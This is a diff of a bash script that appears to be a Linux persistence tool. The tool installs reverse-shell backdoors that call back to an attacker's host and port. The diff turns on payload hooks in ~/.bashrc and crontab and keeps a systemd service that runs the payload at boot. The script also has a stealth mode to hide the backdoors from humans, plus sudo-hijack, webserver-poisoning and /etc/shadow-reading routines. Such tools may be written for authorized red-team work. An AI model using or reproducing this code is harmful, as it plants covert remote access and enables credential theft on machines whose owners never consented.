@@ -29,7 +29,7 @@ HELP="
 \e[33m-i, --rhost\e[0m IP/domain to call back to\n
 \e[33m-p, --rport\e[0m port to call back to\n
 \e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans - see documentation\n
-\e[33m-c, --clean\e[0m reverts any alterations made by this program for the given RHOST"
+\e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST"
 
 while test $# -gt 0;
 do
@@ -124,6 +124,7 @@ METHODS=(
 )
 
 enum_methods() {
+
 	IFS=":"
 	for s in ${METHODS[@]};
 	do
@@ -140,19 +141,22 @@ enum_methods() {
 			fi
 		fi
 	done
+
 }
 
 # enumerate where all backdoors can be placed
 enum_doors() {
+
 	DOORS=(
 		# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
 		# door = command
 		# eval statement = same as above
 		# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
-		#"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc:"
-		#"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON && rm $PERMACRON:"
+		"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc:"
+		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON && rm $PERMACRON:"
 		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;:"
 	)
+
 	IFS=":"
 	for s in ${DOORS[@]};
 	do
@@ -184,9 +188,11 @@ enum_doors() {
 		fi
 	done
 	echo "-----------------------"
+
 }
 
 sudo_hijack_attack() {
+
 	if $(cat /etc/group | grep sudo | grep -qi $(whoami));
 	then
 		if [ "$DRYRUN" -eq 0 ];
@@ -210,9 +216,11 @@ sudo_hijack_attack() {
 		fi
 		echo "-----------------------"
 	fi
+
 }
 
 webserver_poison_attack() {
+
 	if $(grep -qi "www-data" /etc/passwd)
 	then
 		if $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d 2> /dev/null | grep -qi "[A-Za-z0-9]")
@@ -225,9 +233,11 @@ webserver_poison_attack() {
 			echo "-----------------------"
 		fi
 	fi
+
 }
 
 shadow() {
+
 	if $(find /etc/shadow -readable | grep -qi shadow)
 	then
 		if [ "$DRYRUN" -eq 0 ];
@@ -239,6 +249,7 @@ shadow() {
 		fi
 		echo "-----------------------"
 	fi
+
 }
 
 cleanup() {
@@ -284,9 +295,12 @@ cleanup() {
 	fi
 
 	# remove from webserver, need to finish the install part first
+	# remove --stealth-mode modifications
+
 }
 
 main() {
+	
 	if [ "$CLEAN" -eq 1 ];
 	then
 		cleanup $RHOST
@@ -296,6 +310,7 @@ main() {
 	sudo_hijack_attack $PASSWDFILE
 	webserver_poison_attack
 	shadow
+
 }
 
 main
